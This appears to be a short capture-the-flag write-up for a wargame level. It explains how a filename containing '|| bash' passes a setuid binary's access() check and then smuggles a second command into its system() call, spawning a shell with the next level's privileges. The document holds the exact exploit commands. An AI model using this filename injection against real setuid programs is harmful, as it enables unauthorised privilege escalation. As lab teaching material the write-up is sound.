ltrace ./printfile /etc/passwd

```
touch '/tmp/wow.txt || bash'
```
```
./printfile '/tmp/wow.txt || bash'
```

* `access()` **can** access the file `'/tmp/wow.txt || bash'`
    * because we created this file in **leviathan2** permissions.
* but `system()` running this code: `cat /tmp/wow.txt || bash`
    * **there is not** file named `/tmp/wow.txt`, so `bash` command is running in **leviathan3** permissions.
